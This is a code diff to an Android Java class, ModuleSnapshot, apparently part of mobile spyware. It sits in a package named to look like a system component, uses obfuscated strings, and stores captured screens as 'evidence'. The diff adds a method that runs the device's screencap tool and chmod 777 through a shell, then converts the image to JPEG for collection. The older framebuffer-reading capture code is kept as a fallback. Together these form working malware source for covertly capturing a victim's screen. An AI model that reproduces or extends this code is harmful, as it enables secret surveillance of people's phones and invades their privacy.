@@ -17,6 +17,7 @@ import java.util.concurrent.Semaphore;
 
 import android.content.Context;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
 import android.os.Build;
 import android.view.Display;
@@ -36,6 +37,7 @@ import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.WChar;
 import com.android.m.M;
 
@@ -130,118 +132,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
-			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-					.getDefaultDisplay();
-
-			int width, height, w, h;
-			final int orientation = display.getOrientation();
-
-			if (isTablet()) {
-				h = display.getWidth();
-				w = display.getHeight();
-			} else {
-				w = display.getWidth();
-				h = display.getHeight();
-			}
-
-			boolean useOrientation = true;
-			boolean useMatrix = true;
-
-			if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
-				width = w;
-				height = h;
-			} else {
-				height = w;
-				width = h;
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			Bitmap bitmap;
-
-			// 0: invertito blu e rosso
-			// 1: perdita info
-			// 2: invertito blu e verde
-			// 3: no ARGB, no ABGR, no AGRB
-			byte[] raw = getRawBitmap();
-
-			if (raw == null || raw.length == 0) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
-				}
-
-			} else {
-
-				if (usesInvertedColors()) {
-					// sul tablet non e' ARGB ma ABGR.
-					byte[] newraw = new byte[raw.length / 2];
-
-					for (int i = 0; i < newraw.length; i++) {
-						switch (i % 4) {
-						case 0:
-							newraw[i] = raw[i + 2]; // A 3:+2
-							break;
-						case 1:
-							newraw[i] = raw[i]; // R 1:+2 2:+1
-							break;
-						case 2:
-							newraw[i] = raw[i - 2]; // G 2:-1 3:-2
-							break;
-						case 3:
-							newraw[i] = raw[i]; // B 1:-2
-							break;
-						}
-						/*
-						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
-						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
-						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
-						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
-						 * // B 1:-2
-						 */
-					}
-
-					raw = newraw;
-				}
-
-				if (raw != null) {
-					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-				} else {
-					return;
-				}
-				ByteBuffer buffer = ByteBuffer.wrap(raw);
-				bitmap.copyPixelsFromBuffer(buffer);
-				buffer = null;
-				raw = null;
-
-				int rotateTab = 0;
-
-				if (isTablet()) {
-					rotateTab = -90;
-				}
-
-				if (useMatrix && orientation != Surface.ROTATION_0) {
-					final Matrix matrix = new Matrix();
-
-					if (orientation == Surface.ROTATION_90) {
-						matrix.setRotate(270 + rotateTab);
-					} else if (orientation == Surface.ROTATION_270) {
-						matrix.setRotate(90 + rotateTab);
-					} else if (orientation == Surface.ROTATION_180) {
-						matrix.setRotate(180 + rotateTab);
-					} else {
-						matrix.setRotate(rotateTab);
-					}
-
-					bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
-				}
-
-				byte[] jpeg = toJpeg(bitmap);
-				bitmap = null;
-
-				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-				jpeg = null;
+			if(!screencapMethod()){
+				frameBufferMethod();
 			}
 
 		} catch (final Exception ex) {
@@ -257,6 +149,159 @@ public class ModuleSnapshot extends BaseInstantModule {
 			working.release();
 		}
 
+	}
+
+	private boolean screencapMethod() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (screencapMethod) ");
+		}
+		String sc = M.e("/system/bin/screencap");
+		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName()+ M.e("/files/frame.png");
+		
+		AutoFile asc = new AutoFile(sc);
+		AutoFile aframe = new AutoFile(frame);
+		aframe.delete();
+		
+		if(asc.exists() && asc.canRead()){
+			ExecuteResult res = Execute.executeScript( sc + " -p " + frame + ";chmod 777 "+ frame);
+			if(aframe.exists() && aframe.canRead()){
+				Bitmap bitmap = readPng(aframe);
+				if(bitmap == null){
+					return false;
+				}
+				byte[] jpeg = toJpeg(bitmap);
+				if(jpeg == null){
+					return false;
+				}
+				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				return true;
+			}
+		}
+		return false;
+	}
+
+	private Bitmap readPng(AutoFile aframe) {
+		Bitmap bitmap= BitmapFactory.decodeFile(aframe.getFilename());
+		return bitmap;
+	}
+
+	private void frameBufferMethod() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (frameBufferMethod) ");
+		}
+		final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+				.getDefaultDisplay();
+
+		int width, height, w, h;
+		final int orientation = display.getOrientation();
+
+		if (isTablet()) {
+			h = display.getWidth();
+			w = display.getHeight();
+		} else {
+			w = display.getWidth();
+			h = display.getHeight();
+		}
+
+		boolean useOrientation = true;
+		boolean useMatrix = true;
+
+		if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
+			width = w;
+			height = h;
+		} else {
+			height = w;
+			width = h;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+
+		Bitmap bitmap;
+
+		// 0: invertito blu e rosso
+		// 1: perdita info
+		// 2: invertito blu e verde
+		// 3: no ARGB, no ABGR, no AGRB
+		byte[] raw = getRawBitmap();
+
+		if (raw == null || raw.length == 0) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+			}
+
+		} else {
+
+			if (usesInvertedColors()) {
+				// sul tablet non e' ARGB ma ABGR.
+				byte[] newraw = new byte[raw.length / 2];
+
+				for (int i = 0; i < newraw.length; i++) {
+					switch (i % 4) {
+					case 0:
+						newraw[i] = raw[i + 2]; // A 3:+2
+						break;
+					case 1:
+						newraw[i] = raw[i]; // R 1:+2 2:+1
+						break;
+					case 2:
+						newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+						break;
+					case 3:
+						newraw[i] = raw[i]; // B 1:-2
+						break;
+					}
+					/*
+					 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
+					 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
+					 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
+					 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
+					 * // B 1:-2
+					 */
+				}
+
+				raw = newraw;
+			}
+
+			if (raw != null) {
+				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+			} else {
+				return;
+			}
+			ByteBuffer buffer = ByteBuffer.wrap(raw);
+			bitmap.copyPixelsFromBuffer(buffer);
+			buffer = null;
+			raw = null;
+
+			int rotateTab = 0;
+
+			if (isTablet()) {
+				rotateTab = -90;
+			}
+
+			if (useMatrix && orientation != Surface.ROTATION_0) {
+				final Matrix matrix = new Matrix();
+
+				if (orientation == Surface.ROTATION_90) {
+					matrix.setRotate(270 + rotateTab);
+				} else if (orientation == Surface.ROTATION_270) {
+					matrix.setRotate(90 + rotateTab);
+				} else if (orientation == Surface.ROTATION_180) {
+					matrix.setRotate(180 + rotateTab);
+				} else {
+					matrix.setRotate(rotateTab);
+				}
+
+				bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
+			}
+
+			byte[] jpeg = toJpeg(bitmap);
+			bitmap = null;
+
+			EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+			jpeg = null;
+		}
 	}
 
 	private boolean isTablet() {
